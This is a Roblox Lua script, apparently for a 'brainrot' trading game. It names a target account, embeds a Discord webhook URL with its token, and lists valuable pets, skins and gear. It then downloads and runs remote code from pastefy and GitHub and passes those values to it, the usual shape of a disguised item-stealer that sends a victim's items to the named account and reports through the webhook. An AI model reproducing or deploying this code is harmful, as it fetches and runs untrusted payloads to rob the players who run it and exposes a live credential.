local TARGET_ID = 10691755332
local TARGET_USER = "Rokilee_1"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1569757395142443060/65TQ3RuaTxBtMqKzurTODLPN_VuXQMz4N-WGQnt65ar1orCESZTgGLHpZyM0MvIPEnd6"

local TargetBrainrots = {
    ["Dragon Skeletonini"] = true,
    ["Phoenix"] = true,
    ["Hydra Serpent"] = true,
    ["Plant Bros"] = true,
    ["Strawberry Elephant"] = true,
    ["Orchidox"] = true,
    ["Skibidi Toilet"] = true,
    ["Meowl"] = true,
    ["Los Dragons"] = true,
    ["La Craft Machine"] = true,
    ["Gold and Diamond"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Griffin"] = true,
    ["Hydra Bunny"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["John Pork"] = true,
    ["Antonio"] = true,
    ["Elefanto Frigo"] = true,
    ["Arcadragon"] = true,
    ["Pancake and Syrup"] = true,
    ["Rico Dinero"] = true,
    ["Kalika Bros"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["La Casa Boo"] = true,
    ["Dragon Aquanini"] = true,
    ["La Supreme Combinasion"] = true,
    ["Headless Horseman"] = true,
    ["Kraken"] = true,
    ["Venuspino"] = true,
    ["Gorillo Subwoofero"] = true,
    ["Jelly Moby"] = true,
    ["Foxini Lanternini"] = true,
    ["Digi Narwhal"] = true
}

local TargetBaseSkins = {
    ["Tralalero"] = true
}

local TargetGears = {
    ["Alien Slap"] = true,
    ["Blackhole Bomb"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Bloodmoon Slap"] = true,
    ["Candy Sentry"] = true,
    ["Candy Slap"] = true,
    ["Cupid's Wings"] = true,
    ["Cursed Slap"] = true,
    ["Cyber Slap"] = true,
    ["Demon's Head"] = true,
    ["Divine Slap"] = true,
    ["Lava Blaster"] = true,
    ["Lava Slap"] = true,
    ["Radioactive Airstrike"] = true,
    ["Radioactive Slap"] = true,
    ["Rainbow Hammer"] = true,
    ["Rainbow Slap"] = true,
    ["Santa's Sleigh"] = true,
    ["Waverider"] = true,
    ["Witch's Broom"] = true,
    ["Yin Yang Lamp"] = true,
    ["Yin Yang Slap"] = true,
    ["Phantom Slap"] = true,
    ["Crystal Slap"] = true
}

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
end)

task.spawn(function()
    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)